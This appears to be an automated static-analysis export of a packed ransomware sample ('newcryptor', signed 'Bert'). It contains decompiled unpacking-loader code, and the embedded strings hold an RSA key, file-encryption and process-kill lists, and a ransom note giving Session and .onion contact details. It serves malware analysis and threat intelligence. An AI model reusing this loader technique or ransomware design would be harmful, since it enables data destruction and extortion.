{
  "program": {
    "name": "6182df9c60f9069094fb353c4b3294d13130a71f3e677566267d4419f281ef02.exe",
    "format": "Portable Executable (PE)",
    "language": "x86/little/64/default",
    "compiler": "Visual Studio",
    "image_base": "140000000",
    "size": 16384,
    "sha256": "6182df9c60f9069094fb353c4b3294d13130a71f3e677566267d4419f281ef02"
  },
  "functions": [
    {
      "name": "entry",
      "entry": "140001000",
      "size": 305,
      "is_thunk": false,
      "calling_convention": "__fastcall"
    },
    {
      "name": "FUN_140001131",
      "entry": "140001131",
      "size": 1992,
      "is_thunk": false,
      "calling_convention": "__fastcall"
    },
    {
      "name": "FUN_1400018f9",
      "entry": "1400018f9",
      "size": 48,
      "is_thunk": false,
      "calling_convention": "__fastcall"
    },
    {
      "name": "memcpy",
      "entry": "140001930",
      "size": 6,
      "is_thunk": true,
      "calling_convention": "__cdecl"
    },
    {
      "name": "memset",
      "entry": "140001938",
      "size": 6,
      "is_thunk": true,
      "calling_convention": "__cdecl"
    },
    {
      "name": "strcmp",
      "entry": "140001940",
      "size": 6,
      "is_thunk": true,
      "calling_convention": "__cdecl"
    }
  ],
  "imports": [
    "GetModuleHandleA",
    "GetProcAddress",
    "LoadLibraryA",
    "VirtualAlloc",
    "VirtualProtect",
    "memcpy",
    "memset",
    "strcmp"
  ],
  "strings": [
    "!This program cannot be run in DOS mode.\r\r\n$",
    ".text",
    "`.idata",
    ".packed",
    "@<Hc",
    ".packed",
    "@<Hc",
    "@0H)",
    "GetModuleHandleA",
    "GetProcAddress",
    "LoadLibraryA",
    "VirtualAlloc",
    "VirtualProtect",
    "memcpy",
    "memset",
    "strcmp",
    "    ",
    "KERNEL32.dll",
    "msvcrt.dll",
    "!This program cannot be run in DOS mode.\r\r\n$",
    ".text",
    "`.rsrc",
    "ZYi}",
    "ZYi}",
    "\n&*z",
    "\n-\n(K",
    "BSJB",
    "v4.0.30319",
    "#Strings",
    "#GUID",
    "#Blob",
    "<Go>b__10_0",
    "<>9__4_0",
    "<Main>b__4_0",
    "<RunThreads>b__7_0",
    "<>9__4_1",
    "<Main>b__4_1",
    "ConcurrentQueue`1",
    "List`1",
    "<>9__4_2",
    "<Main>b__4_2",
    "Int64",
    "get_UTF8",
    "<Module>",
    "System.IO",
    "get_IV",
    "piskamana",
    "mscorlib",
    "System.Collections.Generic",
    "Read",
    "Thread",
    "<OriginalSize>k__BackingField",
    "<suffix>k__BackingField",
    "FileMode",
    "IDisposable",
    "File",
    "file",
    "IsGoodFileName",
    "get_FullName",
    "IsGoodDirName",
    "get_ProcessName",
    "name",
    "Dispose",
    "Create",
    "Write",
    "CompilerGeneratedAttribute",
    "GuidAttribute",
    "DebuggableAttribute",
    "ComVisibleAttribute",
    "AssemblyTitleAttribute",
    "AssemblyTrademarkAttribute",
    "TargetFrameworkAttribute",
    "AssemblyFileVersionAttribute",
    "AssemblyConfigurationAttribute",
    "AssemblyDescriptionAttribute",
    "CompilationRelaxationsAttribute",
    "AssemblyProductAttribute",
    "AssemblyCopyrightAttribute",
    "AssemblyCompanyAttribute",
    "RuntimeCompatibilityAttribute",
    "Byte",
    "fileQueue",
    "TryDequeue",
    "Enqueue",
    "value",
    "drive",
    "newcryptor.exe",
    "LastBlockSize",
    "get_OriginalSize",
    "set_OriginalSize",
    "size",
    "suff",
    "System.Threading",
    "Encoding",
    "System.Runtime.Versioning",
    "FromXmlString",
    "ToString",
    "Flush",
    "get_Length",
    "EndsWith",
    "EncryptedBlock",
    "TransformBlock",
    "Seek",
    "spisok",
    "Kill",
    "FileStream",
    "Program",
    "System",
    "SymmetricAlgorithm",
    "AsymmetricAlgorithm",
    "Trim",
    "ICryptoTransform",
    "Main",
    "SeekOrigin",
    "System.Reflection",
    "CurrentPosition",
    "Exception",
    "MoveTo",
    "FileInfo",
    "DriveInfo",
    "FileSystemInfo",
    "DirectoryInfo",
    "Sleep",
    "jump",
    "BinaryReader",
    "RSACryptoServiceProvider",
    "DiskWorker",
    "worker",
    "BinaryWriter",
    "ToLower",
    "GetEnumerator",
    ".ctor",
    ".cctor",
    "FileEncryptor",
    "CreateEncryptor",
    "encryptor",
    "newcryptor",
    "System.Diagnostics",
    "RunThreads",
    "CountThreads",
    "System.Runtime.InteropServices",
    "System.Runtime.CompilerServices",
    "newcryptor.Properties.Resources.resources",
    "DebuggingModes",
    "GetDirectories",
    "GetFiles",
    "GetProcesses",
    "put_notes",
    "GetBytes",
    "GetDrives",
    "args",
    "Contains",
    "set_PriorityClass",
    "ProcessPriorityClass",
    "FileAccess",
    "GetCurrentProcess",
    "Concat",
    "Object",
    "Collect",
    "Stopsheet",
    "get_Current",
    "System.Collections.Concurrent",
    "get_Count",
    "BlockCount",
    "Encrypt",
    "EncryptPart",
    "ThreadStart",
    "MakeFileList",
    "workerList",
    "MoveNext",
    "System.Text",
    "AppendAllText",
    "get_suffix",
    "set_suffix",
    "ready",
    "get_Key",
    "SetAesKey",
    "pubkey",
    "System.Security.Cryptography",
    "c:\\windows",
    "note.txt",
    ".exe",
    ".dll",
    ".sys",
    ".lnk",
    "encrypted",
    "\\.note.txt",
    "<RSAKeyValue><Modulus>rQPzaeYeF1xWb4oUtDGA5H66tx+azivLI83M97EUgRPL3NvoHs+TAhXXozCFDuZCkqHzyHrD+zFfnEwNhhR5hGJ7BPqW4x7EZat9OPzIXRD+nFjjlXAZWjCgmwDAo5b/1aKCVLIcdGRBkcAqHsqnNhmRQE3pRl3M9ihp+la5g7dPZ/7Gpxu4B/38LkAIig2Oi4UsWloIjSatQ9IZXZQzEOn4oHSzWm9Dl5jWjRUQwDZsMCX+HSDe4yA7gNLsFQhWZSc6Y59NsQ9n5I3VfLG4vHFC8cBb12c/gMWvPsWYFo7D0ni9OonANLEH72rnSt7N+PvsCUWD1afwpd90VPNxnQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>",
    "encryptedbybert",
    " Hello from Bert!\r\n\r\n \r\nYour network is hacked and files are encrypted.\r\nWe download some important files from your network.\r\n\r\n \r\nInstructions for contacting our team:\r\nDownload the (Session) messenger (https://getsession.org) in messenger :ID  05149ef8a65c342bc76bad335ad3a314ec1321b18cdb6092667083b4e56a4dcb41 \r\n\r\nbertblogsoqmm4ow7nqyh5ik7etsmefdbf25stauecytvwy7tkgizhad.onion our blog\r\n",
    "httpd",
    "nginx",
    "node",
    "java",
    "postgres",
    "redis",
    "memcach",
    "rabbit",
    "elastic",
    "docker",
    "vmmem",
    "code",
    "studio",
    "msvsmon",
    "mongo",
    "shadow",
    "WrapNonExceptionThrows",
    "\nnewcryptor",
    "Copyright ",
    "  2024",
    "$8d292ed2-c3bc-4506-a528-e1147d9bd4d0",
    "1.0.0.0",
    ".NETFramework,Version=v4.7.2",
    "FrameworkDisplayName",
    ".NET Framework 4.7.2",
    "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet",
    "PADPADP",
    "RSDS",
    "D:\\new folder\\Tiger\\newcryptor\\obj\\Release\\newcryptor.pdb",
    "VS_VERSION_INFO",
    "VarFileInfo",
    "Translation",
    "StringFileInfo",
    "000004b0",
    "Comments",
    "CompanyName",
    "FileDescription",
    "newcryptor",
    "FileVersion",
    "1.0.0.0",
    "InternalName",
    "newcryptor.exe",
    "LegalCopyright",
    "Copyright ",
    "  2024",
    "LegalTrademarks",
    "OriginalFilename",
    "newcryptor.exe",
    "ProductName",
    "newcryptor",
    "ProductVersion",
    "1.0.0.0",
    "Assembly Version",
    "1.0.0.0",
    "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n\r\n<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\r\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\r\n    <security>\r\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n</assembly>"
  ],
  "sections": [
    {
      "name": "Headers",
      "start": "140000000",
      "end": "1400001ff",
      "size": 512,
      "initialized": true,
      "read": true,
      "write": false,
      "execute": false,
      "volatile": false,
      "overlay": false,
      "loaded": true,
      "type": "Default",
      "source_name": "",
      "comment": "",
      "entropy": 2.5106,
      "strings_count": 4,
      "functions_count": 0,
      "bytes_total": 512,
      "bytes_sampled": 512,
      "bytes_truncated": false
    },
    {
      "name": ".text",
      "start": "140001000",
      "end": "1400019ff",
      "size": 2560,
      "initialized": true,
      "read": true,
      "write": false,
      "execute": true,
      "volatile": false,
      "overlay": false,
      "loaded": true,
      "type": "Default",
      "source_name": "",
      "comment": "",
      "entropy": 5.0209,
      "strings_count": 4,
      "functions_count": 6,
      "bytes_total": 2560,
      "bytes_sampled": 2560,
      "bytes_truncated": false
    },
    {
      "name": ".idata",
      "start": "140002000",
      "end": "1400021ff",
      "size": 512,
      "initialized": true,
      "read": true,
      "write": true,
      "execute": false,
      "volatile": false,
      "overlay": false,
      "loaded": true,
      "type": "Default",
      "source_name": "",
      "comment": "",
      "entropy": 2.7638,
      "strings_count": 10,
      "functions_count": 0,
      "bytes_total": 512,
      "bytes_sampled": 512,
      "bytes_truncated": false
    },
    {
      "name": ".packed",
      "start": "140003000",
      "end": "1400061ff",
      "size": 12800,
      "initialized": true,
      "read": true,
      "write": true,
      "execute": false,
      "volatile": false,
      "overlay": false,
      "loaded": true,
      "type": "Default",
      "source_name": "",
      "comment": "",
      "entropy": 5.228,
      "strings_count": 237,
      "functions_count": 0,
      "bytes_total": 12800,
      "bytes_sampled": 12800,
      "bytes_truncated": false
    }
  ],
  "libraries": [
    "KERNEL32.DLL",
    "MSVCRT.DLL"
  ],
  "exports": [
    "DAT_140003000",
    "DWORD_140002000",
    "FUN_140001131",
    "FUN_1400018f9",
    "IMAGE_DOS_HEADER_140000000",
    "LAB_140001064",
    "LAB_1400010c5",
    "LAB_1400010c9",
    "LAB_1400010d9",
    "LAB_14000112e",
    "LAB_1400011c0",
    "LAB_1400011d2",
    "LAB_140001226",
    "LAB_14000132d",
    "LAB_1400013b0",
    "LAB_1400013b4",
    "LAB_1400013f9",
    "LAB_140001458",
    "LAB_1400014c5",
    "LAB_140001541",
    "LAB_14000155f",
    "LAB_140001570",
    "LAB_140001592",
    "LAB_1400015b9",
    "LAB_14000162d",
    "LAB_140001658",
    "LAB_1400016e2",
    "LAB_1400016ff",
    "LAB_14000171e",
    "LAB_140001742",
    "LAB_140001762",
    "LAB_140001763",
    "LAB_140001767",
    "LAB_140001787",
    "LAB_140001795",
    "LAB_1400017cd",
    "LAB_140001859",
    "LAB_14000185e",
    "LAB_140001864",
    "LAB_14000187c",
    "LAB_140001881",
    "LAB_140001885",
    "LAB_1400018d3",
    "LAB_1400018f7",
    "PTR_GetModuleHandleA_140002090",
    "PTR_GetProcAddress_140002098",
    "PTR_LoadLibraryA_1400020a0",
    "PTR_VirtualAlloc_1400020a8",
    "PTR_VirtualProtect_1400020b0",
    "PTR_memcpy_1400020c0",
    "PTR_memset_1400020c8",
    "PTR_strcmp_1400020d0",
    "entry",
    "memcpy",
    "memset",
    "strcmp"
  ],
  "entry_points": [],
  "decompiled": [
    {
      "name": "entry",
      "entry": "140001000",
      "c": "\nvoid entry(void)\n\n{\n  int iVar1;\n  undefined4 local_4c;\n  char local_48 [16];\n  longlong local_38;\n  longlong local_30;\n  HMODULE local_28;\n  HMODULE local_20;\n  int local_14;\n  void *local_10;\n  \n  local_28 = GetModuleHandleA((LPCSTR)0x0);\n  local_30 = (longlong)&local_28->unused + (longlong)local_28[0xf].unused;\n  local_38 = local_30 + 0x108;\n  local_10 = (void *)0x0;\n  builtin_strncpy(local_48,\".packed\",8);\n  local_14 = 0;\n  local_20 = local_28;\n  do {\n    if ((int)(uint)*(ushort *)(local_30 + 6) <= local_14) {\nLAB_1400010d9:\n      if (local_10 != (void *)0x0) {\n        local_4c = *(undefined4 *)(local_38 + (ulonglong)*(ushort *)(local_30 + 6) * 0x28 + -0x18);\n        local_10 = (void *)FUN_1400018f9(local_10,&local_4c);\n        FUN_140001131(local_10);\n      }\n      return;\n    }\n    iVar1 = strcmp((char *)(local_38 + (longlong)local_14 * 0x28),local_48);\n    if (iVar1 == 0) {\n      local_10 = (void *)((longlong)&local_20->unused +\n                         (ulonglong)*(uint *)(local_38 + (longlong)local_14 * 0x28 + 0xc));\n      goto LAB_1400010d9;\n    }\n    local_14 = local_14 + 1;\n  } while( true );\n}\n\n"
    },
    {
      "name": "FUN_140001131",
      "entry": "140001131",
      "c": "\nlonglong FUN_140001131(void *param_1)\n\n{\n  uint uVar1;\n  DWORD local_e4;\n  void *local_e0;\n  LPCSTR local_d8;\n  LPCSTR local_d0;\n  LPCSTR local_c8;\n  longlong local_c0;\n  longlong local_b8;\n  HMODULE local_b0;\n  LPCSTR local_a8;\n  ulonglong local_a0;\n  LPVOID local_98;\n  longlong *local_90;\n  uint local_88;\n  uint local_84;\n  uint *local_80;\n  uint local_74;\n  ulonglong local_70;\n  longlong local_68;\n  longlong local_60;\n  longlong local_58;\n  longlong local_50;\n  void *local_48;\n  undefined8 local_40;\n  int local_38;\n  uint local_34;\n  uint *local_30;\n  FARPROC local_28;\n  int local_1c;\n  int local_18;\n  int local_14;\n  HMODULE local_10;\n  \n  local_50 = (longlong)param_1 + (longlong)*(int *)((longlong)param_1 + 0x3c);\n  local_58 = local_50 + 0x108;\n  local_10 = (HMODULE)0x0;\n  local_48 = param_1;\n  if ((*(ushort *)(local_50 + 0x5e) & 0x40) == 0) {\n    local_10 = GetModuleHandleA((LPCSTR)0x0);\n  }\n  else {\n    local_10 = (HMODULE)VirtualAlloc((LPVOID)0x0,(ulonglong)*(uint *)(local_50 + 0x50),0x3000,4);\n    if (local_10 == (HMODULE)0x0) {\n      return 0;\n    }\n  }\n  VirtualProtect(local_10,(ulonglong)*(uint *)(local_50 + 0x54),4,&local_e4);\n  memcpy(local_10,param_1,(ulonglong)*(uint *)(local_50 + 0x54));\n  for (local_14 = 0; local_14 < (int)(uint)*(ushort *)(local_50 + 6); local_14 = local_14 + 1) {\n    local_e0 = (void *)((longlong)&local_10->unused +\n                       (ulonglong)*(uint *)(local_58 + (longlong)local_14 * 0x28 + 0xc));\n    if (*(int *)(local_58 + (longlong)local_14 * 0x28 + 0x10) == 0) {\n      VirtualProtect(local_e0,(ulonglong)*(uint *)(local_58 + (longlong)local_14 * 0x28 + 8),4,\n                     &local_e4);\n      memset(local_e0,0,(ulonglong)*(uint *)(local_58 + (longlong)local_14 * 0x28 + 8));\n    }\n    else {\n      VirtualProtect(local_e0,(ulonglong)*(uint *)(local_58 + (longlong)local_14 * 0x28 + 0x10),4,\n                     &local_e4);\n      memcpy(local_e0,(void *)((ulonglong)*(uint *)(local_58 + (longlong)local_14 * 0x28 + 0x14) +\n                              (longlong)param_1),\n             (ulonglong)*(uint *)(local_58 + (longlong)local_14 * 0x28 + 0x10));\n    }\n  }\n  local_60 = local_50 + 0x88;\n  local_68 = (longlong)&local_10->unused + (ulonglong)*(uint *)(local_50 + 0x90);\n  local_18 = 0;\n  while( true ) {\n    if (*(int *)(local_68 + (longlong)local_18 * 0x14) == 0) {\n      local_70 = (longlong)local_10 - *(longlong *)(local_50 + 0x30);\n      if ((*(int *)(local_60 + 0x28) != 0) && (local_70 != 0)) {\n        for (local_30 = (uint *)((longlong)&local_10->unused + (ulonglong)*(uint *)(local_60 + 0x28)\n                                ); *local_30 != 0;\n            local_30 = (uint *)((longlong)local_30 + (ulonglong)local_30[1])) {\n          local_74 = (uint)((ulonglong)local_30[1] - 8 >> 1);\n          local_80 = local_30 + 2;\n          for (local_34 = 0; local_34 < local_74; local_34 = local_34 + 1) {\n            local_84 = (uint)(*(ushort *)((longlong)local_80 + (longlong)(int)local_34 * 2) >> 0xc);\n            local_88 = *(ushort *)((longlong)local_80 + (longlong)(int)local_34 * 2) & 0xfff;\n            local_90 = (longlong *)\n                       ((longlong)&local_10->unused + (ulonglong)*local_30 + (longlong)(int)local_88\n                       );\n            if (local_84 == 10) {\n              *local_90 = *local_90 + local_70;\n            }\n            else if (local_84 < 0xb) {\n              if (local_84 == 3) {\n                *local_90 = (local_70 & 0xffffffff) + *local_90;\n              }\n              else if (local_84 < 4) {\n                if (local_84 == 1) {\n                  *local_90 = *local_90 + (local_70 >> 0x10 & 0xffff);\n                }\n                else if (local_84 == 2) {\n                  *local_90 = *local_90 + (local_70 & 0xffff);\n                }\n              }\n            }\n          }\n        }\n      }\n      VirtualProtect(local_10,(ulonglong)*(uint *)(local_50 + 0x54),2,&local_e4);\n      for (local_38 = 0; local_38 < (int)(uint)*(ushort *)(local_50 + 6); local_38 = local_38 + 1) {\n        local_98 = (LPVOID)((longlong)&local_10->unused +\n                           (ulonglong)*(uint *)(local_58 + (longlong)local_38 * 0x28 + 0xc));\n        uVar1 = *(uint *)(local_58 + (longlong)local_38 * 0x28 + 0x24);\n        local_a0 = (ulonglong)uVar1;\n        if ((uVar1 & 0x20000000) == 0) {\n          if ((uVar1 & 0x80000000) == 0) {\n            local_40 = 2;\n          }\n          else {\n            local_40 = 4;\n          }\n        }\n        else if ((uVar1 & 0x80000000) == 0) {\n          local_40 = 0x20;\n        }\n        else {\n          local_40 = 0x40;\n        }\n        VirtualProtect(local_98,(ulonglong)*(uint *)(local_58 + (longlong)local_38 * 0x28 + 8),\n                       (DWORD)local_40,&local_e4);\n      }\n      return (longlong)&local_10->unused + (ulonglong)*(uint *)(local_50 + 0x28);\n    }\n    local_a8 = (LPCSTR)((longlong)&local_10->unused +\n                       (ulonglong)*(uint *)(local_68 + (longlong)local_18 * 0x14 + 0xc));\n    local_b0 = LoadLibraryA(local_a8);\n    if (local_b0 == (HMODULE)0x0) break;\n    local_b8 = (longlong)&local_10->unused +\n               (ulonglong)*(uint *)(local_68 + (longlong)local_18 * 0x14);\n    local_c0 = (longlong)&local_10->unused +\n               (ulonglong)*(uint *)(local_68 + (longlong)local_18 * 0x14 + 0x10);\n    local_1c = 0;\n    while (*(longlong *)(local_b8 + (longlong)local_1c * 8) != 0) {\n      local_28 = (FARPROC)0x0;\n      local_c8 = *(LPCSTR *)(local_b8 + (longlong)local_1c * 8);\n      if ((longlong)local_c8 < 0) {\n        local_28 = GetProcAddress(local_b0,local_c8);\n      }\n      else {\n        local_d0 = local_c8 + (longlong)local_10;\n        local_d8 = local_d0 + 2;\n        local_28 = GetProcAddress(local_b0,local_d8);\n      }\n      if (local_28 == (FARPROC)0x0) {\n        return 0;\n      }\n      *(FARPROC *)((longlong)local_1c * 8 + local_c0) = local_28;\n      local_1c = local_1c + 1;\n    }\n    local_18 = local_18 + 1;\n  }\n  return 0;\n}\n\n"
    },
    {
      "name": "FUN_1400018f9",
      "entry": "1400018f9",
      "c": "\nundefined8 FUN_1400018f9(undefined8 param_1,undefined4 *param_2)\n\n{\n  *param_2 = *param_2;\n  return param_1;\n}\n\n"
    },
    {
      "name": "memcpy",
      "entry": "140001930",
      "c": "\nvoid * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)\n\n{\n  void *pvVar1;\n  \n                    /* WARNING: Could not recover jumptable at 0x000140001930. Too many branches */\n                    /* WARNING: Treating indirect jump as call */\n  pvVar1 = memcpy(_Dst,_Src,_Size);\n  return pvVar1;\n}\n\n"
    },
    {
      "name": "memset",
      "entry": "140001938",
      "c": "\nvoid * __cdecl memset(void *_Dst,int _Val,size_t _Size)\n\n{\n  void *pvVar1;\n  \n                    /* WARNING: Could not recover jumptable at 0x000140001938. Too many branches */\n                    /* WARNING: Treating indirect jump as call */\n  pvVar1 = memset(_Dst,_Val,_Size);\n  return pvVar1;\n}\n\n"
    },
    {
      "name": "strcmp",
      "entry": "140001940",
      "c": "\nint __cdecl strcmp(char *_Str1,char *_Str2)\n\n{\n  int iVar1;\n  \n                    /* WARNING: Could not recover jumptable at 0x000140001940. Too many branches */\n                    /* WARNING: Treating indirect jump as call */\n  iVar1 = strcmp(_Str1,_Str2);\n  return iVar1;\n}\n\n"
    }
  ]
}